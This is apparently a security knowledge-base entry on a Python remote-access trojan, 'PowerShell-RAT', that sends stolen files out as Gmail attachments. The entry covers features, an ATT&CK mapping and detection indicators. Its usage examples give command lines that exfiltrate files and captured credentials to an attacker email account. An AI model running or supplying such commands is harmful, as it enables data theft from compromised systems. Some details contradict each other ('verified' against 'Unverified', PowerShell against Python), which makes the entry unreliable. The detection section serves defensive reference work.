---
id: 48eaf54c-50ec-4a41-85f7-d95be9ddbc2c
type: tool
verified: true
created_at: '2019-08-28T21:17:32.783588+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - rat
  - backdoor
  - exfiltration
  - c2
  - python
url: ''
validated: true
---

# PowerShell-RAT

**Status**: Unverified

## Overview

PowerShell-RAT is a Python-based backdoor tool designed for remote access and data exfiltration. It leverages Gmail as a command-and-control (C2) channel and attachment mechanism to stealthily send stolen data, making it suitable for post-exploitation in red team operations where traditional C2 might be detected.

## Description

This tool functions as a remote access trojan (RAT) implemented in Python, allowing attackers to maintain persistence on compromised systems and exfiltrate files or data via email attachments sent through a Gmail account. Despite the name suggesting PowerShell integration, the core implementation uses Python's standard libraries (e.g., smtplib for email) to handle communications. It can be deployed on various platforms and is particularly useful in environments where outbound email traffic is less monitored than direct network connections.

## Features

- Gmail-based C2 and exfiltration: Uses email attachments for data transfer without requiring custom servers.
- Cross-platform compatibility: Runs on Linux, Windows, and macOS with Python 3.
- Configurable persistence: Can be set to run periodically or on triggers.
- Lightweight: Minimal dependencies, relying on built-in Python modules.
- Obfuscation potential: Email subjects and bodies can be customized to blend with normal traffic.

## Installation

### Requirements

- Python 3.6 or higher
- Access to a Gmail account (with app-specific password enabled for SMTP)
- smtplib and email libraries (built-in to Python)

### Install Commands

```bash
# Download the script (assuming available from a repository or direct download)
wget https://example.com/powershell_rat.py -O powershell_rat.py

# No additional installation needed if using built-in libraries; otherwise:
pip install secure-smtplib  # Optional for enhanced security
```

For Windows, ensure Python is in PATH. On Kali/Ubuntu, Python 3 is pre-installed.

## Basic Usage

```bash
python powershell_rat.py --help
```

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Show help message and available commands |
| --setup | Initialize configuration with Gmail credentials |
| --run | Execute the backdoor for exfiltration |
| -v, --verbose | Enable verbose logging for debugging |

## Examples

### Example 1: Basic Usage

Setup and run exfiltration:

```bash
python powershell_rat.py --setup --email attacker@gmail.com --password app_password
python powershell_rat.py --run --config config.json --attach sensitive_file.txt
```

### Example 2: Advanced Usage

Run with custom data in body:

```bash
python powershell_rat.py --run --config config.json --data "Captured credentials: user:pass" --attach logs.zip
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Web Protocols]] Application Layer Protocol: Web Protocols (Gmail uses HTTPS/SMTP)
- [[Exfiltration to Cloud Storage]] Exfiltration Over Web Service: Exfiltration to Cloud Storage (email as service)
- [[Windows Remote Management]] Remote Services: Cloud Services (Gmail C2)

### Tactics

- [[Command and Control]] Command And Control
- [[Exfiltration]] Exfiltration
- [[Defense Evasion]] Defense Evasion

## Detection

Indicators and methods for detecting this tool's usage:

- Unusual outbound SMTP traffic to Gmail servers from non-standard ports or processes.
- Python processes with smtplib imports spawning unexpectedly.
- Email attachments from internal IPs with suspicious subjects or contents.
- Monitor for config files containing Gmail credentials on endpoints.
- SIEM rules for Python executions tied to email libraries.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Meterpreter]]
- [[tools/Empire]]

## References

- Python smtplib documentation: https://docs.python.org/3/library/smtplib.html
- Gmail SMTP settings: https://support.google.com/mail/answer/7126229
